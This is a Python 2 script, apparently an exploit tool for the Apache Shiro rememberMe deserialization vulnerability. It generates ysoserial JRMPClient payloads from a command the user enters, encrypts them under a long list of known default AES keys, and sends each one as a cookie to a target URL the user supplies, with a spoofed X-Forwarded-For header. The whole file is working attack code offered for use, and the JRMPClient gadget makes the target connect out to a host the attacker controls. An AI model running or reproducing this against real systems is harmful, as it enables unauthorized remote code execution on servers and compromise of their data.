#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2020/07/17
# @Author  : psponge



import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
import time
import requests
import re
import json
import urllib2


from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def encode_rememberme(commands,key1):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-master-SNAPSHOT.jar', 'JRMPClient', commands], stdout=subprocess.PIPE)
    BS  = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  key1
    print key
    print commands
    mode =  AES.MODE_CBC
    iv  =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
	
if __name__ == '__main__':
    command = raw_input("please input your command:")
    vuln_web = raw_input("please input your vuln web:")
    keys = [
'kPH+bIxk5D2deZiIxcaaaA==','4AvVhmFLUs0KTA3Kprsdag==','Z3VucwAAAAAAAAAAAAAAAA==','fCq+/xW488hMTCD+cmJ3aQ==','0AvVhmFLUs0KTA3Kprsdag==','1AvVhdsgUs0FSA3SDFAdag==',
	'1QWLxg+NYmxraMoxAXu/Iw==','25BsmdYwjnfcWmnhAciDDg==','2AvVhdsgUs0FSA3SDFAdag==','3AvVhmFLUs0KTA3Kprsdag==','3JvYhmBLUs0ETA5Kprsdag==','r0e3c16IdVkouZgk1TKVMg==','5aaC5qKm5oqA5pyvAAAAAA==',
	'5AvVhmFLUs0KTA3Kprsdag==','6AvVhmFLUs0KTA3Kprsdag==','6NfXkC7YVCV5DASIrEm1Rg==','6ZmI6I2j5Y+R5aSn5ZOlAA==','cmVtZW1iZXJNZQAAAAAAAA==','7AvVhmFLUs0KTA3Kprsdag==','8AvVhmFLUs0KTA3Kprsdag==',
	'8BvVhmFLUs0KTA3Kprsdag==','9AvVhmFLUs0KTA3Kprsdag==','OUHYQzxQ/W9e/UjiAGu6rg==','a3dvbmcAAAAAAAAAAAAAAA==','aU1pcmFjbGVpTWlyYWNsZQ==','bWljcm9zAAAAAAAAAAAAAA==','bWluZS1hc3NldC1rZXk6QQ==',
	'bXRvbnMAAAAAAAAAAAAAAA==','ZUdsaGJuSmxibVI2ZHc9PQ==','wGiHplamyXlVB11UXWol8g==','U3ByaW5nQmxhZGUAAAAAAA==','MTIzNDU2Nzg5MGFiY2RlZg==','L7RioUULEFhRyxM7a2R/Yg==','a2VlcE9uR29pbmdBbmRGaQ==',
	'WcfHGU25gNnTxTlmJMeSpw==','OY//C4rhfwNxCQAQCrQQ1Q==','5J7bIJIV0LQSN3c9LPitBQ==','f/SY5TIve5WWzT4aQlABJA==','bya2HkYo57u6fWh5theAWw==','WuB+y2gcHRnY2Lg9+Aqmqg==','kPv59vyqzj00x11LXJZTjJ2UHW48jzHN',
	'3qDVdLawoIr1xFd6ietnwg==','6Zm+6I2j5Y+R5aS+5ZOlAA==','2A2V+RFLUs+eTA3Kpr+dag==','6ZmI6I2j3Y+R1aSn5BOlAA==','SkZpbmFsQmxhZGUAAAAAAA==','2cVtiE83c4lIrELJwKGJUw==','fsHspZw/92PrS3XrPW+vxw==',
	'XTx6CKLo/SdSgub+OPHSrw==','sHdIjUN6tzhl8xZMG3ULCQ==','O4pdf+7e+mZe8NyxMTPJmQ==','HWrBltGvEZc14h9VpMvZWw==','rPNqM6uKFCyaL10AK51UkQ==','ZnJlc2h6Y24xMjM0NTY3OA==','Jt3C93kMR9D5e8QzwfsiMw==',
	'Y1JxNSPXVwMkyvES/kJGeQ==','lT2UvDUmQwewm6mMoiw4Ig==','MPdCMZ9urzEA50JDlDYYDg==','xVmmoltfpb8tTceuT5R7Bw==','c+3hFGPjbgzGdrC+MHgoRQ==','ClLk69oNcA3m+s0jIMIkpg==','Bf7MfkNR0axGGptozrebag==',
	'ZmFsYWRvLnh5ei5zaGlybw==','cGhyYWNrY3RmREUhfiMkZA==','IduElDUpDDXE677ZkhhKnQ==','yeAAo1E8BOeAYfBlm4NG9Q==','cGljYXMAAAAAAAAAAAAAAA==','2itfW92XazYRi5ltW0M2yA==','MTIzNDU2NzgxMjM0NTY3OA==',
	'XgGkgqGqYrix9lI6vxcrRw==','ertVhmFLUs0KTA3Kprsdag==','5AvVhmFLUS0ATA4Kprsdag==','s0KTA3mFLUprK4AvVhsdag==','hBlzKg78ajaZuTE0VLzDDg==','9FvVhtFLUs0KnA3Kprsdyg==','d2ViUmVtZW1iZXJNZUtleQ==',
	'4BvVhmFLUs0KTA3Kprsdag==','MzVeSkYyWTI2OFVLZjRzZg==','empodDEyMwAAAAAAAAAAAA==','A7UzJgh1+EWj5oBFi+mSgw==','c2hpcm9fYmF0aXMzMgAAAA==','i45FVt72K2kLgvFrJtoZRw==','U3BAbW5nQmxhZGUAAAAAAA==',
	'Q01TX0JGTFlLRVlfMjAxOQ==','ZAvph3dsQs0FSL3SDFAdag==','Is9zJ3pzNh2cgTHB4ua3+Q==','NsZXjXVklWPZwOfkvk6kUA==','vXP33AonIp9bFwGl7aT7rA==','V2hhdCBUaGUgSGVsbAAAAA==',
	'YI1+nBV//m7ELrIyDHm6DQ==','NGk/3cQ6F5/UNPRh8LpMIg==','1tC/xrDYs8ey+sa3emtiYw==','yNeUgSzL/CfiWw1GALg6Ag==','GAevYnznvgNCURavBhCr1w==','66v1O8keKNV3TTcGPK1wzg==','SDKOLKn2J1j/2BHjeZwAoQ==',
	'Z3h6eWd4enklMjElMjElMjE=','CrownKey==a12d/dakdad','ZWvohmPdUsAWT3=KpPqda','YTM0NZomIzI2OTsmIzM0NTueYQ==']
    for key1 in keys:
        time_key = str(time.time())
        key2 =  key1[0:3]
        commands = key2 + '.' + command
        payload = encode_rememberme(commands,key1)

        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'X-Forwarded-For': '127.0.0.1',
        'Cookie':'rememberMe=' + payload,
        'Accept':'*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        }
        s = requests.Session()
        vulurl = vuln_web
        try:
            proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}        
            resp = s.get(vulurl,headers=headers,timeout=15,verify=False)
        except Exception,e:
            print e
